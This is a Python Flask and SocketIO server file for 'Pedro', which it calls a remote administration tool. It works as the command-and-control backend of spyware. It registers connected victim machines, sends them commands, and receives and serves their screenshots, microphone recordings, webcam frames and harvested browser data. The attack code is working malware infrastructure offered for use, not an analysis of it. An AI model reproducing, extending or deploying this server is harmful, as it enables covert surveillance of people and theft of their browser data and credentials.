import base64
import json
import os
import threading
from datetime import datetime, time

from flask import Flask, request, send_file, Response
from flask_jwt_extended import create_access_token, jwt_required, JWTManager
from flask_migrate import Migrate
from flask_restx import Api, Resource, fields
from flask_socketio import SocketIO, emit

from client.media_utils import gen_frames
from config.config import Config
from config.extensions import db
from models import Client, Command, CommandType
from queue import Queue

app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)
migrate = Migrate(app, db)
jwt = JWTManager(app)
video_frames = Queue()

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=10 ** 8)

authorizations = {
    'bearer_auth': {
        'type': 'apiKey',
        'in': 'header',
        'name': 'Authorization'
    }
}

api = Api(app, version='1.0', title='Pedro API Documentation',
          description='API Documentation for Pedro, a remote administration tool.',
          authorizations=authorizations)

auth_ns = api.namespace('api/v1/auth', description='Authentication operations')
command_ns = api.namespace('api/v1/command', description='Command operations')
clients_ns = api.namespace('api/v1/clients', description='Client operations')
screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
browser_ns = api.namespace('api/v1/browser', description='Browser data operations')

auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
command_model = api.model('Command', {
    'command': fields.String(required=True, description='Commande à exécuter'),
    'params': fields.Raw(required=False, description='Paramètres de la commande')
})
client_model = api.model('Client', {
    'id': fields.Integer(required=True, description='ID du client'),
    'ip': fields.String(required=True, description='Adresse IP du client'),
    'os': fields.String(required=False, description='Système d\'exploitation du client'),
    'os_version': fields.String(required=False, description='Version du système d\'exploitation du client'),
    'hostname': fields.String(required=False, description='Nom d\'hôte du client'),
    'status': fields.String(required=True, description='Statut du client'),
    'date_created': fields.String(required=True, description='Date de création du client'),
    'date_updated': fields.String(required=True, description='Date de mise à jour du client')
})
screenshots_model = api.model('Screenshots', {
    'id': fields.Integer(required=True, description='ID de la capture d\'écran'),
    'file_path': fields.String(required=True, description='Chemin du fichier de la capture d\'écran'),
    'date_created': fields.String(required=True, description='Date de création de la capture d\'écran')
})
microphone_model = api.model('Microphone', {
    'id': fields.Integer(required=True, description='ID de l\'enregistrement audio'),
    'file_path': fields.String(required=True, description='Chemin du fichier de l\'enregistrement audio'),
    'date_created': fields.String(required=True, description='Date de création de l\'enregistrement audio')
})
browser_model = api.model('Browser', {
    'id': fields.Integer(required=True, description='ID des données du navigateur'),
    'browser_name': fields.String(required=True, description='Nom du navigateur'),
    'file_path': fields.String(required=True, description='Chemin du fichier des données du navigateur'),
    'date_created': fields.String(required=True, description='Date de création des données du navigateur')
})

client_params = api.parser()
client_params.add_argument('status', type=str, required=False, help='Filter clients by their status (online/offline).')


@auth_ns.route('/')
class Authenticate(Resource):
    @auth_ns.expect(auth_model)
    def post(self):
        auth_data = request.json
        if auth_data and auth_data.get('secret_key') == app.config['JWT_SECRET_KEY']:
            token = create_access_token(identity='bot_discord')
            return {'access_token': f'Bearer {token}'}, 200
        else:
            return {"msg": "Mauvaise clé secrète"}, 401


@command_ns.route('/<int:client_id>')
class HandleCommand(Resource):
    @jwt_required()
    @command_ns.expect(command_model)
    @api.doc(security='bearer_auth')
    def post(self, client_id):
        command_data = request.get_json()
        command = command_data.get('command')
        params = command_data.get('params', {})

        if isinstance(params, str):
            try:
                params = json.loads(params)
            except json.JSONDecodeError:
                return {'status': 'error', 'message': 'Paramètres mal formés (JSON invalide).'}, 400

        duration = params.get('duration', 10) if isinstance(params, dict) else 10

        client = Client.query.get(client_id)
        if client and client.status == 'online':
            socketio.emit('command', {'command': command, 'params': duration}, room=client.sid)
            return {'status': 'success',
                    'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
        elif client and client.status == 'offline':
            return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
        else:
            return {'status': 'error', 'message': 'Client non trouvé.'}, 404


@clients_ns.route('/')
class GetClients(Resource):
    @jwt_required()
    @clients_ns.expect(client_params)
    @clients_ns.marshal_with(client_model, as_list=True)
    @api.doc(security='bearer_auth')
    def get(self):
        status_filter = request.args.get('status')
        if status_filter:
            clients = Client.query.filter_by(status=status_filter).all()
        else:
            clients = Client.query.all()
        for client in clients:
            client.date_created = client.date_created.strftime('%d/%m/%Y à %H:%M:%S')
            client.date_updated = client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
        return clients, 200


@screenshot_ns.route('/client/<int:client_id>')
class GetScreenshotsByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @screenshot_ns.marshal_with(screenshots_model, as_list=True)
    def get(self, client_id):
        screenshots = Command.query.filter_by(client_id=client_id, type=CommandType.SCREENSHOT).all()
        for screenshot in screenshots:
            screenshot.date_created = screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        return screenshots, 200


@screenshot_ns.route('/image/<int:screenshot_id>')
class GetScreenshotImage(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, screenshot_id):
        screenshot = Command.query.get(screenshot_id)
        if screenshot and os.path.exists(screenshot.file_path):
            return send_file(screenshot.file_path, mimetype='image/png')
        else:
            return {'status': 'error', 'message': 'Capture d\'écran non trouvée.'}, 404


@microphone_ns.route('/client/<int:client_id>')
class GetMicrophonesByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @microphone_ns.marshal_with(microphone_model, as_list=True)
    def get(self, client_id):
        microphones = Command.query.filter_by(client_id=client_id, type=CommandType.MICROPHONE).all()
        for microphone in microphones:
            microphone.date_created = microphone.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        return microphones, 200


@microphone_ns.route('/audio/<int:microphone_id>')
class GetMicrophoneAudio(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, microphone_id):
        microphone = Command.query.get(microphone_id)
        if microphone and os.path.exists(microphone.file_path):
            return send_file(microphone.file_path, mimetype='audio/wav')
        else:
            return {'status': 'error', 'message': 'Enregistrement audio non trouvé.'}, 404


@browser_ns.route('/client/<int:client_id>/<string:browser_name>')
class GetBrowserDataByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @browser_ns.marshal_with(browser_model, as_list=True)
    def get(self, client_id, browser_name):
        browser_data = Command.query.filter_by(client_id=client_id, type=CommandType.BROWSER_DATA,
                                               browser_name=browser_name).all()
        for data in browser_data:
            data.date_created = data.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        return browser_data, 200


@browser_ns.route('/data/<int:browser_id>')
class GetBrowserDataFile(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, browser_id):
        data = Command.query.get(browser_id)
        if data and os.path.exists(data.file_path):
            return send_file(data.file_path, mimetype='text/plain')
        else:
            return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404


@socketio.on('connect')
def handle_connect():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    sid = request.sid
    client = Client.query.filter_by(ip=client_ip).first()
    if client:
        client.status = 'online'
        client.sid = sid
        client.date_updated = datetime.now()
    else:
        client = Client(ip=client_ip, status='online', sid=sid, date_created=datetime.now())
        db.session.add(client)
    db.session.commit()


@socketio.on('system_info')
def handle_system_info(data):
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client.os = data.get('os')
        client.os_version = data.get('os_version')
        client.hostname = data.get('hostname')
        db.session.commit()


@socketio.on('screenshot_response')
def handle_screenshot(data):
    screenshot_bytes = base64.b64decode(data.get('screenshot'))
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client_ip = client.ip
        screenshot_dir = f"screenshots/{client_ip}"
        os.makedirs(screenshot_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
        screenshot_path = f"{screenshot_dir}/{file_name}"
        with open(screenshot_path, 'wb') as f:
            f.write(screenshot_bytes)
        new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path)
        db.session.add(new_command)
        db.session.commit()


@socketio.on('audio_response')
def handle_audio(data):
    audio_bytes = base64.b64decode(data.get('audio'))
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client_ip = client.ip
        audio_dir = f"audio/{client_ip}"
        os.makedirs(audio_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav"
        audio_path = f"{audio_dir}/{file_name}"
        with open(audio_path, 'wb') as f:
            f.write(audio_bytes)
        new_command = Command(type=CommandType.MICROPHONE, client_id=client.id, file_path=audio_path)
        db.session.add(new_command)
        db.session.commit()


@socketio.on('browser_data_response')
def handle_browser_data(data):
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        browser = data.get('browser')
        type = data.get('type')
        data = data.get('data')
        browser_dir = f"browsers/{client.ip}/{browser}"
        os.makedirs(browser_dir, exist_ok=True)
        file_path = f"{browser_dir}/{type}.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(data)
        if db.session.query(Command).filter_by(file_path=file_path).count() > 0:
            return
        new_command = Command(type=CommandType.BROWSER_DATA,
                              client_id=client.id,
                              file_path=file_path,
                              browser_name=browser)
        db.session.add(new_command)
        db.session.commit()


@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client.status = 'offline'
        client.date_updated = datetime.now()
        db.session.commit()

@socketio.on('video_frame')
def handle_frame(data):
    frame_data = base64.b64decode(data['data'])
    video_frames.put(frame_data)

@app.route('/video_feed/<int:client_id>')
def video_feed(client_id):
    # Vous pouvez ici ajouter une authentification ou des contrôles spécifiques au client
    return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


def stream_frames():
    while True:
        if not video_frames.empty():
            frame_data = video_frames.get()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
        else:
            time.sleep(0.05)


if __name__ == '__main__':
    socketio.run(app, host='127.0.0.1', port=5000, debug=True, ssl_context=('cert.pem', 'key.pem'))
